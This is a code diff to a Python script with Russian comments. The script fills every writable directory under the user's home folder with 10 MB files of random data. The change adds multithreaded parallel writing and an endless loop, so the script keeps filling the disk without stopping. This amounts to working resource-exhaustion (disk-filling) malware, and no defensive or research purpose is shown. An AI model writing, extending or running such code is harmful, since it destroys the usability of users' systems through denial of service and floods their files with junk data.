@@ -2,6 +2,8 @@ import os
 import random
 import string
 import traceback
+import concurrent.futures
+import time
 
 def generate_random_data(size):
     """Генерирует случайные данные для файла"""
@@ -31,27 +33,36 @@ def is_writable(directory):
         traceback.print_exc()
         return False
 
-def traverse_and_create_files(root_dir, file_size):
-    """Обходит все директории в домашней директории и создает файлы размером file_size, проверяя права на запись"""
+def create_files_in_directory(dirpath, file_size):
+    """Создает файлы в данной директории"""
     try:
-        for dirpath, dirnames, filenames in os.walk(root_dir):
-            print(f"Проверка директории: {dirpath}")  # Выводим проверяемую директорию
-            
-            # Пропускаем системные директории или защищенные
-            if '/sys/' in dirpath or '/proc/' in dirpath:
-                continue
-            
-            # Проверяем, есть ли права на запись в директорию
-            if not is_writable(dirpath):
-                print(f"Нет прав на запись в {dirpath}")  # Выводим, если нет прав на запись
-                continue
-            
-            # Генерируем случайное имя файла
-            random_file_name = ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + '.txt'
-            file_path = os.path.join(dirpath, random_file_name)
-            
-            # Создаем файл в доступных директориях
-            create_large_file(file_path, file_size)
+        # Генерируем случайное имя файла
+        random_file_name = ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + '.txt'
+        file_path = os.path.join(dirpath, random_file_name)
+        
+        # Проверяем, есть ли права на запись в директорию
+        if not is_writable(dirpath):
+            print(f"Нет прав на запись в {dirpath}")
+            return
+
+        # Создаем файл в доступной директории
+        create_large_file(file_path, file_size)
+    except Exception as e:
+        print(f"Ошибка при создании файла в директории {dirpath}: {e}")
+        traceback.print_exc()
+
+def traverse_and_create_files(root_dir, file_size):
+    """Обходит все директории в домашней директории и создает файлы размером file_size, используя многозадачность"""
+    try:
+        with concurrent.futures.ThreadPoolExecutor() as executor:
+            # Получаем список всех поддиректорий в корневой директории
+            for dirpath, dirnames, filenames in os.walk(root_dir):
+                # Пропускаем системные директории или защищенные
+                if '/sys/' in dirpath or '/proc/' in dirpath:
+                    continue
+                
+                # Отправляем задачу на создание файлов в директорию
+                executor.submit(create_files_in_directory, dirpath, file_size)
     except Exception as e:
         print(f"Ошибка в traverse_and_create_files: {e}")
         traceback.print_exc()
@@ -61,7 +72,12 @@ def main():
         file_size = 10 * 1024 * 1024  # 10 MB
         root_dir = os.path.expanduser("~")  # Начальная директория для обхода — домашняя директория
         print(f"Начинаем создание файлов в директории: {root_dir}")
-        traverse_and_create_files(root_dir, file_size)
+        
+        # Запускаем бесконечный цикл для непрерывного создания файлов
+        while True:
+            traverse_and_create_files(root_dir, file_size)
+            time.sleep(1)  # Задержка перед следующим циклом, чтобы избежать перегрузки
+
     except Exception as e:
         print(f"Ошибка в main: {e}")
         traceback.print_exc()
